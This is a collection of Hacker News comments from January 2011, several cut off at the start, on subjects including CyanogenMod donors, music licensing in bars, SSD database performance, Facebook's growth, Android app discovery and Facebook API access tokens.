By virtue of that, the complainers are less likely to come from the actual donor list.<p>My empirical evidence comes from the Cyanogenmod Android project - where ""when can I haz gingerbread"" or ""this sucks - why arent you spending enough time fixing <bug>"" is always from non donors.<p>NOTE: it is easy to see this trend on the CM forums, because your forum handle displays whether you are a donor or not. That I think is an easy way to lower the credibility of flamers (something that isnt possible on Clojure Google Groups). But then again, maybe that in itself give rises to the expectation that ""if I donate, I can flame"". I havent seen it happen on the CM forums though.",1294203592

Bar do get sued when they haven't licensed the music properly, and I recall hearing of instances of them being sued successfully merely for having music played over the radio to a large audience, because it wasn't licensed correctly. Of course, it's only the large labels who actually have the resources to do this; bands would probably generally be okay with it (exposure, increasing the chance of people buying their records or going to their shows).",1294203454

2069966,comment,2069272,2069505,0,0,Periodic,,,"I haven't done the cost analysis lately, but what this does is bring more IOPS in at a lower price point.  The cost of RAM is not static, the more you have the more expensive it gets because you need better motherboards and specialized chassis to handle it and really manage all those buses.  SSDs bring in an intermediate point between magnetic disks and RAM so that you can get some more IOPS in at that lower price point.<p>Of course, if you need all you can get you should always go for just RAM, but you can get a significant improvement with a modest investment through SSDs.<p>The best example would be the large data set (say 100GB with a random access pattern or 100GB of working set) with enough requests that it starting to strain the RAID system you have.  At this point your medium is saturated so latency is going up and up.  Getting 128 GB of RAM is expensive, but swapping those drives out for a few 100GB SSDs is not hard and may alleviate the DB bottle-neck until something else becomes the bottle-neck and you need to change that anyway.  Switching to RAM wouldn't have bought you anything more than the SSDs because in both cases you are getting acceptable performance up to the next bottleneck.<p>I'd like to think that SSDs will get us to the point that we don't have to worry about disk latency and can just toss data on there without having the database always be the bottleneck.",1294203394

People are finding a use for it beyond 'old acquaintances becoming newly visible"".<p>You have the average user who uses it to keep in touch with friends, but you also have a growing number of users who are using Facebook in more and more creative ways. I personally know a couple of hundred friends who have thousands of pictures hosted on it (not something they'd give up easily), I've seen my mother find all her elementary classmates and organize a reunion spanning several states all within 2 months (surprised even me, I didn't think she got past her yahoo email).<p>My point is, Facebook's utility for its users is still increasing, something that stagnated in Myspace' case.  We haven't even touched on the social gaming aspect of it (If I see another cityville invite I swear I'll block them fools). Growth to me involves more creative ways to involve its existing users, as well as of course growing its numbers (which it is).  There's still the potential of its international users (which I believe is larger than its US Mainland users), increased corporate/business identities on the site, social commerce (barely touched), organized product reviews, that new mail system it's supposedly rolling out, and so on.  We can talk numbers, but potential for monetizing their existing userbase appeals to me more.",1294203171

It's bad on both platforms, but it's definitely worse on Android.<p>This is in part because of Google's ethos and choices -- search many a word on the Android market, you'll find what you were looking for, and six copies of the same name item from China which ask for dubious permissions -- and in part, just the nature of the app-sales-on-a-small-mobile-screen beast right now.<p>Apple has this same problem, as evidenced by the many, many graphs showing the sales hockeystick once you hit 'top ten' status, but my guess is that there is a little more love shared around with different developers than with Google.<p>Why do I think that? I think that because ""Robo Defense"" has been a top game on Android since I bought my first G1. Every day, every week, every month.<p>Rather than someone at Google judiciously marketing and bringing out new app and game developer product on the 'top' section of the store, they are totaling up all sales ever, and giving those people top slots. This is what I mean by the algorithm making things worse, in this case, particularly for app discovery.<p>Even a simple 'tops this month' with an editor-chosen list on the first day of the month would make a big difference in reach for developers.<p>In the end, I guess I disagree with you -- I think the Android app store is broken, as is the Apple app store. It's just that Google's is a little bit worse, and doesn't seem to have a credible plan to change the game yet. We'll see!",1294202560

According to the article, the group with no added incentive (from erotic pictures) to choose correctly had accuracy which would be expected, at about 50%. However, the group with the stimulating pictures was able to beat the 50% threshold. Presumably, the brain of those test takers had more incentive to use all resources available to be correct, including any extrasensory ones...<p>As such, test subjects knowing they are in the group with the erotic pictures should still be able to beat the 50% threshold.<p>Edit: Actually, I'm reading through the actual experiment and it appears all 100 sessions used both erotic and nonerotic pictures of varying arousal value. Also, both the position of the picture and the picture itself were not actually chosen by the computer until <i>after</i> the test taker made the choice, although they were told differently, making it a test for a future event.

This included the BONE network stack and some 3D support. Everything about Dan0 was, of course, very much development code, but it was definitely a marked improvement over R5. Haiku was able to use some of the Dan0 high level kits in place until rewrites could be made.<p>Clearly the Apple/Be Inc. issues were sorted out to Apple's benefit, but it's still neat to see what could have been. OS X had its own issues in its widely released beta, after all. ;)",1294200583

I'm not likely to do that, especially for an unknown application. I understand it's a social app, so there are good reasons to link it with  FB and Twitter, but it would be nice to bypass the signin part in order to see what it's like and whether I like it before committing to a connection with FB/Twitter. Maybe I missed that option, but if so, it wasn't an obvious one.<p>The point of my comment, I guess, is that if you want more feedback and awareness, maybe you need to make it more accessible?",1294200392

The next time, and every subsequent time Application X wants to access the FB API on the user's behalf it is required to send that access token. From javascript you might be able to change the token, however, Application X's next interaction with the FB API will fail if the token is invalid and there is no way to derive a token value from a FB user's id.",1294200365

It also agreed to give refunds to customers who believe they were cheated.</i><p>These types of companies who make outrageous statements and pretend to have science behind them should be forced to give double the money back, or more.<p>The problem with an even refund is that the company losses almost nothing for making the false claim. Chances are it got them more sales, even if you include the cost of refunds. And the person returning the product never gets a full refund when you include shipping and the time it takes to deal with the hassle.<p>To keep companies honest you have to make them lose money for bad business practices. You have to charge them far more than they would risk making an outrageous claim.",1294200348

The original idea was to create a place where people would give their take - review products they have and had.<p>The idea spun from our internet marketing efforts at the time. Lots of people are searching for reviews online and there's so much spam content out there... we set to find a solution. It's only about a year later that we started to work full-time on the idea. It was the first time for us to work on a project like this and made all sorts of mistakes along the way. But we're finally done and releasing it!<p>Feel free to email me at matt at taketake, perhaps we can help each other in the space! Cheers!",1294200317

The answer is ""Well, you can't.""<p>If you haven't put the time into creating a reputation (either for yourself or for your product) and getting people excited about your next release, you aren't going to suddenly find yourself able to tap into a nonexistent audience.<p>What you can do is grow your reputation by creating great products and growing a community of people who are interested.  Launch to a hundred people, and don't be disappointed that you're not a hit by next Tuesday.  Overnight success stories are rare, and almost always backed by years of hard work.  There's no secret website that you have to submit to and people will suddenly start using your product.<p>You'll gain users over time.  At least in my experience, now is the best time for iteration.

Did the bar steal from the artist by letting you and others hear something you don't own? Should the DJ call the artist first to get permission?<p>Please explain why it is not incumbent upon the artist to request that someone stop playing a copy of their music in public. Or why - if no digital/physical copies are being distributed - the label should have the right to make such a request.<p>Also, Grooveshark is in fact operating ""legitimately"" according to EMI, all of their other partners and legal precedent.
